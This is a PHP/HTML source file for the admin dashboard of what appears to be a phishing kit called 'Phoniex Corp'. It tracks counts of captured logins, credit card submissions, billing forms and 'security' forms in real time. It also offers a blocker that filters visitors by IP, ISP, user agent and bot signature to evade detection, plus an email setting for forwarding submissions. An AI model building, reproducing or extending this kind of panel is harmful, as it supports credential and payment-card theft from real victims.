<?php
defined("ALLOW") or exit('No direct script access allowed');
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Admin Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; 
            background: #f8f9fa;
            color: #495057;
            overflow-x: hidden;
        }
        .admin-layout {
            display: flex;
            min-height: 100vh;
        }
        .sidebar {
            width: 280px;
            background: white;
            box-shadow: 2px 0 10px rgba(0,0,0,0.1);
            position: fixed;
            height: 100vh;
            overflow-y: auto;
        }
        .sidebar-header {
            padding: 30px 25px;
            border-bottom: 1px solid #e9ecef;
        }
        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 24px;
            font-weight: 700;
            color: #6f42c1;
        }
        .logo-icon {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #6f42c1 0%, #20c997 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 18px;
        }
        .sidebar-nav {
            padding: 20px 0;
        }
        .nav-item {
            display: block;
            padding: 15px 25px;
            color: #6c757d;
            text-decoration: none;
            transition: all 0.3s ease;
            border-left: 3px solid transparent;
        }
        .nav-item:hover, .nav-item.active {
            background: #f8f9fa;
            color: #6f42c1;
            border-left-color: #6f42c1;
        }
        .nav-item i {
            width: 20px;
            margin-right: 15px;
        }
        .main-content {
            margin-left: 280px;
            flex: 1;
        }
        .top-bar {
            background: white;
            padding: 20px 30px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .page-title {
            font-size: 28px;
            font-weight: 600;
            color: #495057;
        }
        .user-menu {
            display: flex;
            align-items: center;
            gap: 20px;
        }
        .logout-btn {
            background: #dc3545;
            color: white;
            padding: 8px 16px;
            text-decoration: none;
            transition: all 0.3s ease;
        }
        .logout-btn:hover {
            background: #c82333;
        }
        .content {
            padding: 30px;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: white;
            padding: 25px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        .stat-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0,0,0,0.15);
        }
        .stat-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        .stat-title {
            color: #6c757d;
            font-size: 14px;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .stat-icon {
            width: 50px;
            height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: white;
        }
        .stat-value {
            font-size: 32px;
            font-weight: 700;
            color: #495057;
            margin-bottom: 5px;
        }
        .stat-subtitle {
            color: #6c757d;
            font-size: 14px;
        }
        .revenue { background: linear-gradient(135deg, #20c997 0%, #17a2b8 100%); }
        .sales { background: linear-gradient(135deg, #6f42c1 0%, #e83e8c 100%); }
        .templates { background: linear-gradient(135deg, #007bff 0%, #6610f2 100%); }
        .clients { background: linear-gradient(135deg, #fd7e14 0%, #dc3545 100%); }
        .action-cards {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 25px;
        }
        .action-card {
            background: white;
            padding: 30px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            transition: all 0.3s ease;
        }
        .action-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0,0,0,0.15);
        }
        .action-title {
            font-size: 20px;
            font-weight: 600;
            color: #495057;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .action-btn {
            display: inline-block;
            padding: 12px 24px;
            background: linear-gradient(135deg, #6f42c1 0%, #20c997 100%);
            color: white;
            text-decoration: none;
            font-weight: 500;
            transition: all 0.3s ease;
            margin-top: 15px;
        }
        .action-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(111, 66, 193, 0.3);
        }
    </style>
</head>
<body>
    <div class="admin-layout">
        <div class="sidebar">
            <div class="sidebar-header">
                <div class="logo">
                    <div class="logo-icon">P</div>
                    Phoniex Corp
                </div>
            </div>
            <nav class="sidebar-nav">
                <a href="#" class="nav-item active admin-nav-link" data-page="admin-dashboard">
                    <span>📊</span> Dashboard
                </a>
                <a href="#" class="nav-item admin-nav-link" data-page="admin-email">
                    <span>📧</span> Configuration
                </a>
                <a href="#" class="nav-item admin-nav-link" data-page="admin-stats">
                    <span>📈</span> Statistics
                </a>
                <a href="#" class="nav-item admin-nav-link" data-page="admin-blocker">
                    <span>🚫</span> Blocker
                </a>
            </nav>
        </div>
        
        <div class="main-content">
            <div class="top-bar">
                <h1 class="page-title">Dashboard</h1>
                <div class="user-menu">
                    <a href="#" onclick="logout()" class="logout-btn">Logout</a>
                </div>
            </div>
            
            <div class="content">
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-header">
                            <span class="stat-title">Real Visitor</span>
                            <div class="stat-icon revenue">👥</div>
                        </div>
                        <div class="stat-value" id="realVisitors">0</div>
                        <div class="stat-subtitle">Unique visitors <span style="color: #28a745; font-size: 10px;">● LIVE</span></div>
                    </div>
                    
                    <div class="stat-card">
                        <div class="stat-header">
                            <span class="stat-title">Total Login</span>
                            <div class="stat-icon sales">🔐</div>
                        </div>
                        <div class="stat-value" id="totalLogin">0</div>
                        <div class="stat-subtitle">Login attempts</div>
                    </div>
                    
                    <div class="stat-card">
                        <div class="stat-header">
                            <span class="stat-title">Total CC</span>
                            <div class="stat-icon templates">💳</div>
                        </div>
                        <div class="stat-value" id="totalCC">0</div>
                        <div class="stat-subtitle">CC submissions</div>
                    </div>
                    
                    <div class="stat-card">
                        <div class="stat-header">
                            <span class="stat-title">Total Billing</span>
                            <div class="stat-icon clients">📋</div>
                        </div>
                        <div class="stat-value" id="totalBilling">0</div>
                        <div class="stat-subtitle">Billing forms</div>
                    </div>
                    
                    <div class="stat-card">
                        <div class="stat-header">
                            <span class="stat-title">Total Security</span>
                            <div class="stat-icon revenue">🛡️</div>
                        </div>
                        <div class="stat-value" id="totalSecurity">0</div>
                        <div class="stat-subtitle">Security forms</div>
                    </div>
                    
                    <div class="stat-card">
                        <div class="stat-header">
                            <span class="stat-title">Bots</span>
                            <div class="stat-icon sales">🤖</div>
                        </div>
                        <div class="stat-value" id="totalBots">0</div>
                        <div class="stat-subtitle">Bot detections</div>
                    </div>
                </div>
                
                <div class="action-cards">
                    <div class="action-card">
                        <div class="action-title">⚙️ Configuration</div>
                        <p>Configure email recipient and IP geolocation API settings for form submissions and notifications.</p>
                        <a href="#" class="action-btn admin-nav-link" data-page="admin-email">Configure Email</a>
                    </div>
                    
                    <div class="action-card">
                        <div class="action-title">📈 Live Statistics</div>
                        <p>Monitor real-time visitor activity, form submissions, and bot detection with live updates.</p>
                        <a href="#" class="action-btn admin-nav-link" data-page="admin-stats">View Statistics</a>
                    </div>
                    
                    <div class="action-card">
                        <div class="action-title">🚫 Access Control</div>
                        <p>Block unwanted visitors by IP address, ISP, User Agent, or bot signatures.</p>
                        <a href="#" class="action-btn admin-nav-link" data-page="admin-blocker">Manage Blocker</a>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script>
        // Admin navigation with access codes
        document.querySelectorAll('.admin-nav-link').forEach(link => {
            link.addEventListener('click', function(e){
                e.preventDefault();
                const page = this.getAttribute('data-page');
                const code = window.__ACCESS_CODE__ || '';
                location.href = code ? `/${code}/${page}` : `/${page}`;
            });
        });

        async function logout() {
            const code = window.__ACCESS_CODE__ || '';
            if (code) { 
                await fetch(`/${code}/admin-logout`); 
                location.href = '/?phoniex'; 
            } else { 
                await fetch('/admin-logout'); 
                location.href = '/admin'; 
            }
        }
        
        // Real-time stats loading
        function loadStats() {
            const code = window.__ACCESS_CODE__ || '';
            const url = code ? `/${code}/admin-stats?action=stats` : '/admin-stats?action=stats';
            
            fetch(url)
                .then(r => r.json())
                .then(stats => {
                    document.getElementById("realVisitors").textContent = stats.real_visitors || 0;
                    document.getElementById("totalLogin").textContent = stats.total_login || 0;
                    document.getElementById("totalCC").textContent = stats.total_cc || 0;
                    document.getElementById("totalBilling").textContent = stats.total_billing || 0;
                    document.getElementById("totalSecurity").textContent = stats.total_security || 0;
                    document.getElementById("totalBots").textContent = stats.bots || 0;
                })
                .catch((err) => {
                    console.error('Stats loading error:', err);
                    // Fallback to placeholder data
                    document.getElementById("realVisitors").textContent = "Error";
                    document.getElementById("totalLogin").textContent = "Error";
                    document.getElementById("totalCC").textContent = "Error";
                    document.getElementById("totalBilling").textContent = "Error";
                    document.getElementById("totalSecurity").textContent = "Error";
                    document.getElementById("totalBots").textContent = "Error";
                });
        }
        
        // Load stats immediately and then every 5 seconds
        loadStats();
        setInterval(loadStats, 5000);
    </script>
</body>
</html>
